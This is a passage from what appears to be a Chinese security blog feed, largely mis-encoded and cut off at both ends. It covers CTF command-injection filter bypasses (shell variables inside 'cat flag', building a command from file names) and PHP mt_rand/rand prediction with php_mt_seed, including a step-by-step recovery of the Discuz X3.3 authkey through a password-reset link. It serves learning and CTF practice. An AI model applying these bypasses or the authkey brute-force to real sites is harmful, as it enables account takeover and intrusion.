é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©º</td></tr><tr><td align="center">$@</td><td align="center">ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ã€‚ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚è¢«åŒå¼•å·åŒ…å‡½æ—¶ï¼Œä¸$*ç¨æœ‰ä¸åŒ</td></tr><tr><td align="center">$?</td><td align="center">ä¸Šä¸ªå‘½ä»¤çš„æ¨å‡ºçŠ¶æ€ï¼Œæˆ–å‡½æ•°çš„è¿”å›å€¼</td></tr></tbody></table><p><strong>linux shellä¸­$nè¡¨ç¤ºä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°</strong>ã€‚n æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚<br>ä¾‹å¦‚ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯1ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯2ã€‚è€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚<br>$@è¡¨ç¤º<br>æ¯”å¦‚ï¼š<code>ca$@t fla$@g</code><br><code>ca$1t fla$2g</code></p><h3 id="5-é•¿åº¦é™åˆ¶"><a href="#5-é•¿åº¦é™åˆ¶" class="headerlink" title="5.é•¿åº¦é™åˆ¶"></a>5.é•¿åº¦é™åˆ¶</h3><p>é•¿åº¦é™åˆ¶å¯ä»¥ç”¨<strong>æ–‡ä»¶æ„é€ </strong>çš„æ–¹å¼æ¥ç»•è¿‡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linuxä¸‹å¯ä»¥ç”¨ 1&gt;aåˆ›å»ºæ–‡ä»¶åä¸ºaçš„ç©ºæ–‡ä»¶</span><br><span class="line">ls -t&gt;<span class="built_in">test</span>åˆ™ä¼šå°†ç›®å½•æŒ‰æ—¶é—´æ’åºåå†™è¿›<span class="built_in">test</span>æ–‡ä»¶ä¸­</span><br><span class="line">shå‘½ä»¤å¯ä»¥ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è¯»å–å‘½ä»¤æ¥æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h3 id="6-å†…è”æ‰§è¡Œ"><a href="#6-å†…è”æ‰§è¡Œ" class="headerlink" title="6.å†…è”æ‰§è¡Œ"></a>6.å†…è”æ‰§è¡Œ</h3><p>å‘½ä»¤æ›¿ä»£ï¼Œå¤§éƒ¨åˆ†Unix shellä»¥åŠç¼–ç¨‹è¯­è¨€å¦‚Perlã€PHPä»¥åŠRubyç­‰éƒ½ä»¥æˆå¯¹çš„é‡éŸ³ç¬¦(åå¼•å·)ä½œæŒ‡ä»¤æ›¿ä»£ï¼Œæ„æ€æ˜¯ä»¥æŸä¸€ä¸ªæŒ‡ä»¤çš„è¾“å‡ºç»“æœä½œä¸ºå¦ä¸€ä¸ªæŒ‡ä»¤çš„è¾“å…¥é¡¹ã€‚<br>ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a`pwd`&quot;</span></span><br></pre></td></tr></table></figure><p>ç±»ä¼¼çš„è¿˜æœ‰$(command).<br>ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> â€œabcd $(<span class="built_in">pwd</span>)â€</span><br></pre></td></tr></table></figure><h3 id="7-é€šé…ç¬¦"><a href="#7-é€šé…ç¬¦" class="headerlink" title="7.é€šé…ç¬¦"></a>7.é€šé…ç¬¦</h3><p>ä¸Šé¢å·²ç»è®°è¿‡</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://blog.zeddyu.info/2019/01/17/å‘½ä»¤æ‰§è¡Œ/</a></p><p><a href="https://blog.csdn.net/silence1_/article/details/96135760">https://blog.csdn.net/silence1_/article/details/96135760</a></p><p><a href="https://www.freebuf.com/articles/web/137923.html">https://www.freebuf.com/articles/web/137923.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> bypass </tag>
            
            <tag> ctf </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä¼ªéšæœºæ•°</title>
      <link href="2019/12/30/php-fakerandom-number/"/>
      <url>2019/12/30/php-fakerandom-number/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†phpä¼ªéšæœºæ•°çš„ç›¸å…³å†…å®¹ï¼ï¼ï¼</p><a id="more"></a><h2 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h2><h3 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h3><p>mt_randå‡½æ•°æœ‰ä¸¤ä¸ªå¯é€‰å‚æ•° min å’Œ maxï¼Œå¦‚æœæ²¡æœ‰æä¾›å¯é€‰å‚æ•°ï¼Œmt_randå‡½æ•°å°†è¿”å›è¿”å› 0 åˆ° mt_getrandmax() ä¹‹é—´çš„ä¼ªéšæœºæ•°ã€‚ä¾‹å¦‚æƒ³è¦ 5 åˆ° 15ï¼ˆåŒ…æ‹¬ 5 å’Œ 15ï¼‰ä¹‹é—´çš„éšæœºæ•°ï¼Œç”¨ mt_rand(5, 15)ã€‚</p><h3 id="mt-srand"><a href="#mt-srand" class="headerlink" title="mt_srand()"></a>mt_srand()</h3><p>ç”¨äºæ’­ä¸‹ä¸€ä¸ªæ›´å¥½çš„éšæœºæ•°å‘ç”Ÿå™¨ç§å­ï¼Œç”¨ <code>seed</code> æ¥ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ã€‚ æ²¡æœ‰è®¾å®š <code>seed</code> å‚æ•°æ—¶ï¼Œä¼šè¢«è®¾ä¸ºéšæ—¶æ•°ã€‚è‡ª PHP 4.2.0 èµ·ï¼Œä¸å†éœ€è¦ç”¨ <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> æˆ– <strong>mt_srand()</strong> ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ ï¼Œå› ä¸ºç°åœ¨æ˜¯ç”±ç³»ç»Ÿè‡ªåŠ¨å®Œæˆçš„ã€‚</p><p>è¿™å¼ å›¾æ„Ÿè§‰æŒºå¥½çš„</p><p><img src="/2019/12/30/php-fakerandom-number/pseudorandom.png"></p><h2 id="ä¸€ä¸ªé¢˜ç›®"><a href="#ä¸€ä¸ªé¢˜ç›®" class="headerlink" title="ä¸€ä¸ªé¢˜ç›®"></a>ä¸€ä¸ªé¢˜ç›®</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $a = @$_REQUEST[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    $seed = @$_REQUEST[<span class="string">&#x27;seed&#x27;</span>];</span><br><span class="line">    $key = @$_REQUEST[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    mt_srand($seed);</span><br><span class="line">    $true_key = mt_rand();</span><br><span class="line">    <span class="keyword">if</span> ($key == $true_key)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Key Confirm&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªé¢˜ç›®ä¼ äº†ä¸‰ä¸ªå‚æ•°ï¼Œseedå¯æ§ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€åœ¨phpstudyé€‰æ‹©ç›¸åŒçš„phpç‰ˆæœ¬è®¾å®šç›¸åŒçš„seedï¼Œè¾“å‡ºäº§ç”Ÿçš„éšæœºæ•°å°±è¡Œ</p><h2 id="phpç‰ˆæœ¬å·®åˆ«"><a href="#phpç‰ˆæœ¬å·®åˆ«" class="headerlink" title="phpç‰ˆæœ¬å·®åˆ«"></a>phpç‰ˆæœ¬å·®åˆ«</h2><p>php5å’Œphp7ä¼šç”¨ä¸åŒçš„ç®—æ³•æ¥ç”Ÿæˆéšæœºæ•°ï¼Œæ‰€ä»¥å³ä½¿seedç›¸åŒç”Ÿæˆçš„éšæœºæ•°ä¹Ÿä¸ç›¸åŒ</p><h2 id="php-mt-seed"><a href="#php-mt-seed" class="headerlink" title="php_mt_seed"></a>php_mt_seed</h2><p>php_mt_seedæ˜¯ä¸€ä¸ªç ´è§£mt_randå‡½æ•°seedçš„å·¥å…·ï¼Œåœ¨æœ€ç®€å•çš„è°ƒç”¨æ¨¡å¼ä¸‹ï¼Œå®ƒèƒ½é€šè¿‡mt_randç¬¬ä¸€æ¬¡è¾“å‡ºçš„å€¼å¯»æ‰¾mt_randçš„seedï¼Œåœ¨æ›´é«˜çº§çš„æ¨¡å¼ä¸­å®ƒèƒ½åŒ¹é…ä¸æ˜¯ç¬¬ä¸€æ¬¡è¾“å‡ºçš„å’Œä¸æ˜ç¡®å…·ä½“è¾“å‡ºçš„æƒ…å†µã€‚</p><p>p_mt_seedåŸºäºå‘½ä»¤è¡Œè¿è¡Œï¼Œå‘½ä»¤è¡Œå¯ä»¥ä½¿ç”¨1ï¼Œ2ï¼Œ4æˆ–è€…æ›´å¤šçš„å‚æ•°ã€‚è¿™äº›å‚æ•°éœ€è¦è¯¦ç»†è¯´æ˜mt_rand()çš„è¾“å‡ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lepiaf/php_mt_seed.git</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>4.0ç‰ˆæœ¬ä»è¿™é‡Œä¸‹è½½ï¼š<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz</a></p><h3 id="ä¸€ä¸ªå‚æ•°"><a href="#ä¸€ä¸ªå‚æ•°" class="headerlink" title="ä¸€ä¸ªå‚æ•°"></a>ä¸€ä¸ªå‚æ•°</h3><p>å½“åªæœ‰ä¸€ä¸ªå‚æ•°çš„æ—¶å€™ï¼Œè¿™ä¸ªå‚æ•°ä»£è¡¨mt_randç¬¬ä¸€æ¬¡è¾“å‡ºçš„å€¼ã€‚</p><h3 id="ä¸¤ä¸ªå‚æ•°"><a href="#ä¸¤ä¸ªå‚æ•°" class="headerlink" title="ä¸¤ä¸ªå‚æ•°"></a>ä¸¤ä¸ªå‚æ•°</h3><p>å½“æœ‰ä¸¤ä¸ªå‚æ•°çš„æ—¶å€™ï¼Œä»–ä»¬ä»£è¡¨mt_randç¬¬ä¸€æ¬¡è¾“å‡ºåº”è¯¥ä½äºä»€ä¹ˆåŒºé—´å†…ã€‚</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæœ€å°å€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæœ€å¤§å€¼ã€‚</p><h3 id="å››ä¸ªå‚æ•°ï¼ˆé«˜çº§æ¨¡å¼ï¼‰"><a href="#å››ä¸ªå‚æ•°ï¼ˆé«˜çº§æ¨¡å¼ï¼‰" class="headerlink" title="å››ä¸ªå‚æ•°ï¼ˆé«˜çº§æ¨¡å¼ï¼‰"></a>å››ä¸ªå‚æ•°ï¼ˆé«˜çº§æ¨¡å¼ï¼‰</h3><p>å‰ä¸¤ä¸ªå‚æ•°è¡¨ç¤ºmt_randè¾“å‡ºçš„å€¼ï¼Œåä¸¤ä¸ªå‚æ•°è¡¨ç¤ºmt_randè¾“å‡ºçš„åŒºé—´(ä»0å¼€å§‹)ã€‚</p><h3 id="å¤šäºäº”ä¸ªå‚æ•°ï¼ˆé«˜çº§æ¨¡å¼ï¼‰"><a href="#å¤šäºäº”ä¸ªå‚æ•°ï¼ˆé«˜çº§æ¨¡å¼ï¼‰" class="headerlink" title="å¤šäºäº”ä¸ªå‚æ•°ï¼ˆé«˜çº§æ¨¡å¼ï¼‰"></a>å¤šäºäº”ä¸ªå‚æ•°ï¼ˆé«˜çº§æ¨¡å¼ï¼‰</h3><p>æ¯å››ä¸ªå‚æ•°ä¸€ç»„ï¼Œä½†æ˜¯æœ€åä¸€ç»„å¯ä»¥æ˜¯1ï¼Œ2æˆ–4ä¸ªå‚æ•°ï¼ŒæŒ‰ç…§ä¸Šé¢çš„æ ¼å¼ã€‚</p><p>è¯¦ç»†ä½¿ç”¨å‚è§ï¼š<a href="https://www.openwall.com/php_mt_seed/README">https://www.openwall.com/php_mt_seed/README</a></p><h3 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h3><p>è¿™é‡Œç”¨çš„æ˜¯php7.0</p><p><img src="/2019/12/30/php-fakerandom-number/20191230154805.png"></p><p>å‡è®¾æœ‰è¿™æ ·ä¸€ä¸ªç”Ÿæˆéšæœºåºåˆ—çš„ç®—æ³•ï¼Œç”Ÿæˆäº†ä¸‹å›¾çš„éšæœºæ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_password</span>(<span class="params">$length = <span class="number">10</span></span>) </span>&#123;</span><br><span class="line">$allowable_characters = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"> $len = strlen($allowable_characters) - <span class="number">1</span>;</span><br><span class="line"> $pass = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line"> $pass .= $allowable_characters[mt_rand(<span class="number">0</span>, $len)];</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> $pass;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> mt_srand(time());</span><br><span class="line"> <span class="keyword">echo</span> user_password(), <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> user_password(), <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> user_password(), <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/php-fakerandom-number/20191230170601.png"></p><p>å†™ä¸€ä¸ªç¨‹åºæ¥è½¬æ¢ç”Ÿæˆçš„éšæœºæ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">pwd=<span class="string">&quot;UHsI89HQVr&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">print(str(s.index(i))+<span class="string">&quot; &quot;</span>+str(s.index(i))+<span class="string">&quot; 0 61 &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">//ç»“æœï¼š<span class="number">46</span> <span class="number">46</span> <span class="number">0</span> <span class="number">61</span> <span class="number">33</span> <span class="number">33</span> <span class="number">0</span> <span class="number">61</span> <span class="number">18</span> <span class="number">18</span> <span class="number">0</span> <span class="number">61</span> <span class="number">34</span> <span class="number">34</span> <span class="number">0</span> <span class="number">61</span> <span class="number">60</span> <span class="number">60</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">33</span> <span class="number">33</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">17</span> <span class="number">17</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/php-fakerandom-number/20191230170814.png"></p><p>ç„¶åæˆ‘ä»¬éªŒè¯ä¸€ä¸‹ç”¨çˆ†ç ´å‡ºæ¥çš„seedæ˜¯å¦èƒ½ç”Ÿæˆç›¸åŒçš„åºåˆ—</p><p><img src="/2019/12/30/php-fakerandom-number/20191230171228.png"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸå®ç°</p><h2 id="Discuz-X3-3-authkeyç”Ÿæˆç®—æ³•æ¼æ´"><a href="#Discuz-X3-3-authkeyç”Ÿæˆç®—æ³•æ¼æ´" class="headerlink" title="Discuz X3.3 authkeyç”Ÿæˆç®—æ³•æ¼æ´"></a>Discuz X3.3 authkeyç”Ÿæˆç®—æ³•æ¼æ´</h2><p>ç”¨æˆ·åœ¨åˆæ¬¡å®‰è£…è½¯ä»¶æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªauthkeyå†™å…¥å…¨å±€é…ç½®æ–‡ä»¶å’Œæ•°æ®åº“ï¼Œä¹‹åå®‰è£…æ–‡ä»¶ä¼šè¢«åˆ é™¤ã€‚è¯¥authkeyç”¨äºå¯¹æ™®é€šç”¨æˆ·çš„cookieè¿›è¡ŒåŠ å¯†ç­‰å¯†ç å­¦æ“ä½œï¼Œä½†æ˜¯ç”±äºç”Ÿæˆç®—æ³•è¿‡äºç®€å•ï¼Œå¯ä»¥åˆ©ç”¨å…¬å¼€ä¿¡æ¯è¿›è¡Œæœ¬åœ°çˆ†ç ´ã€‚authkeyç”Ÿæˆç®—æ³•ä½äº<code>Discuz_X3.3_SC_UTF8/upload/install/index.php</code>ä¸­</p><p>authkeyçš„ç”Ÿæˆæ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$authkey = substr(md5($_SERVER[<span class="string">&#x27;SERVER_ADDR&#x27;</span>].$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, <span class="number">0</span>, <span class="number">6</span>)), <span class="number">8</span>, <span class="number">6</span>).random(<span class="number">10</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºauthkeyä¸»è¦ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p><p>MD5çš„ä¸€éƒ¨åˆ†ï¼ˆå‰6ä½ï¼‰ + randomç”Ÿæˆçš„10ä½</p><p>è·Ÿå…¥randomå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length</span>) </span>&#123;</span><br><span class="line">$hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">$max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">PHP_VERSION &lt; <span class="string">&#x27;4.2.0&#x27;</span> &amp;&amp; mt_srand((<span class="keyword">double</span>)microtime() * <span class="number">1000000</span>);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">$hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºå­—ç¬¦ç”Ÿæˆé›†åˆæ˜¯å›ºå®šçš„ï¼Œä¸”æ²¡æœ‰é‡å¤å­—ç¬¦ï¼Œé‚£ä¹ˆå‡½æ•°ä¸­æ¯ä¸€æ¬¡ç”Ÿæˆhashéƒ½å”¯ä¸€å¯¹åº”äº†charsæ•°ç»„ä¸­çš„ä¸€ä¸ªä½ç½®ï¼Œè€Œä¸”æ˜¯ä½¿ç”¨åŒä¸€ä¸ªseedç”Ÿæˆçš„ã€‚</p><p>åœ¨ä¹‹åçš„ä»£ç ä¸­ä½¿ç”¨äº†åŒæ ·çš„randomå‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_config[<span class="string">&#x27;cookie&#x27;</span>][<span class="string">&#x27;cookiepre&#x27;</span>] = random(<span class="number">4</span>).<span class="string">&#x27;_&#x27;</span>;</span><br></pre></td></tr></table></figure><p>Cookieçš„å‰å››ä¸ªå­—èŠ‚æ˜¯å·²çŸ¥çš„ï¼Œå¹¶ä¸”ä½¿ç”¨äº†åŒæ ·çš„randomå‡½æ•°ï¼Œé‚£ä¹ˆæ€è·¯å¾ˆæ˜æ˜¾ï¼š</p><p>é€šè¿‡å·²çŸ¥çš„4ä½ï¼Œç®—å‡ºrandomä½¿ç”¨çš„ç§å­ï¼Œè¿›è€Œå¾—åˆ°authkeyå10ä½ã€‚é‚£å‰©ä¸‹çš„å°±éœ€è¦æå®šå‰6ä½ï¼Œæ ¹æ®å…¶ç”Ÿæˆç®—æ³•ï¼Œåªå¥½é€‰æ‹©çˆ†ç ´çš„æ–¹å¼ï¼Œç”±äºæ•°é‡å¤ªå¤§ï¼Œå°±ä¸€å®šè¦é€‰æ‹©ä¸€ä¸ªæœ¬åœ°çˆ†ç ´çš„æ–¹å¼ï¼ˆå³ä½¿ç”¨åˆ°authkeyè€Œä¸”åŠ å¯†åçš„ç»“æœæ˜¯å·²çŸ¥çš„ï¼‰ã€‚</p><p>åœ¨è°ƒç”¨authcodeå‡½æ•°å¾ˆå¤šçš„åœ°æ–¹éƒ½å¯ä»¥è¿›è¡Œæ ¡éªŒï¼Œåœ¨è¿™é‡Œä½¿ç”¨æ‰¾å›å¯†ç é“¾æ¥ä¸­çš„idå’Œsignå‚æ•°ï¼š</p><p>signç”Ÿæˆçš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dsign</span>(<span class="params">$str, $length = <span class="number">16</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> substr(md5($str.getglobal(<span class="string">&#x27;config/security/authkey&#x27;</span>)), <span class="number">0</span>, ($length ? max(<span class="number">8</span>, $length) : <span class="number">16</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çˆ†ç ´authkey çš„æµç¨‹ï¼š</p><ol><li>é€šè¿‡cookieå‰ç¼€çˆ†ç ´éšæœºæ•°çš„seedã€‚ä½¿ç”¨php_mt_seedå·¥å…·ã€‚</li><li>ç”¨seedç”Ÿæˆrandom(10)ï¼Œå¾—åˆ°æ‰€æœ‰å¯èƒ½çš„authkeyåç¼€ã€‚</li><li>ç»™è‡ªå·±çš„è´¦å·å‘é€ä¸€å°æ‰¾å›å¯†ç é‚®ä»¶ï¼Œå–å‡ºæ‰¾å›å¯†ç é“¾æ¥ã€‚</li><li>ç”¨ç”Ÿæˆçš„åç¼€çˆ†ç ´å‰6ä½ï¼ŒèŒƒå›´æ˜¯0x000000-0xffffffï¼Œå’Œæ‰¾å›å¯†ç urlæ‹¼æ¥ååšMD5æ±‚å‡ºsignã€‚</li><li>å°†æ±‚å‡ºçš„signå’Œæ‰¾å›å¯†ç é“¾æ¥ä¸­çš„signå¯¹æ¯”ï¼Œç›¸ç­‰å³åœæ­¢ï¼Œè·å–å½“å‰çš„authkeyã€‚</li></ol><h2 id="mt-rand-çš„ä¸€ç§æ–°æ€è·¯"><a href="#mt-rand-çš„ä¸€ç§æ–°æ€è·¯" class="headerlink" title="mt_rand()çš„ä¸€ç§æ–°æ€è·¯"></a>mt_rand()çš„ä¸€ç§æ–°æ€è·¯</h2><p>å‚è§Hgameä¸Šé¢çš„ä¸€é“é¢˜ï¼š<a href="https://www.moonback.xyz/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/#%E4%BA%8C%E5%8F%91%E5%85%A5%E9%AD%82%EF%BC%81">https://www.moonback.xyz/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/#%E4%BA%8C%E5%8F%91%E5%85%A5%E9%AD%82%EF%BC%81</a></p><h2 id="rand-å‡½æ•°å®‰å…¨"><a href="#rand-å‡½æ•°å®‰å…¨" class="headerlink" title="rand()å‡½æ•°å®‰å…¨"></a>rand()å‡½æ•°å®‰å…¨</h2><p>åæ¥äº†è§£åˆ°è¿™ä¸ªå‡½æ•°åœ¨æŸäº›æ¡ä»¶ä¸‹ç”Ÿæˆçš„éšæœºæ•°ä¹Ÿæ˜¯å¯ä»¥é¢„æµ‹çš„</p><p>å…ˆè¯´ä¸‹åœ¨linuxä¸‹ï¼ŒPHP randå‡½æ•°åœ¨åº•å±‚ä½¿ç”¨çš„æ˜¯glibc rand()ï¼Œå®ƒä¼šä¿ç•™å‰é¢ç”Ÿæˆéšæœºæ•°çš„æ•°æ®ï¼Œä½œä¸ºåé¢éšæœºæ•°ç”Ÿæˆçš„ä¾æ®ï¼Œä»¥æ­¤ä¿è¯ä¼ªéšæœºæ•°çš„å‡åŒ€æ€§ï¼Œä½†è¿™æ ·ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯å¦‚æœæˆ‘ä»¬çŸ¥é“å‰é¢ç”Ÿæˆçš„éšæœºåºåˆ—ï¼Œé‚£ä¹ˆå®Œå…¨å¯ä»¥é¢„æµ‹åé¢çš„éšæœºæ•°ï¼Œå…¬å¼ï¼š</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num[n] = (num[n<span class="number">-3</span>] + num[n<span class="number">-31</span>]) mod (MAX)</span><br></pre></td></tr></table></figure><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$num = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">//ç”Ÿæˆ50ä¸ªä¼ªéšæœºæ•°</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">50</span>; $i++) &#123;</span><br><span class="line">    $num[$i] = rand(<span class="number">0</span>,<span class="number">100000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">31</span>; $i &lt; <span class="number">50</span>; $i++)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç¬¬&quot;</span>.($i+<span class="number">1</span>).<span class="string">&quot;ä¸ªéšæœºæ•°ï¼š&quot;</span>.$num[$i].<span class="string">&quot;\t&quot;</span>.<span class="string">&quot;å‘å‰æ•°ç¬¬ä¸‰ä¸ªæ•°ï¼š&quot;</span>.$num[$i<span class="number">-31</span>].<span 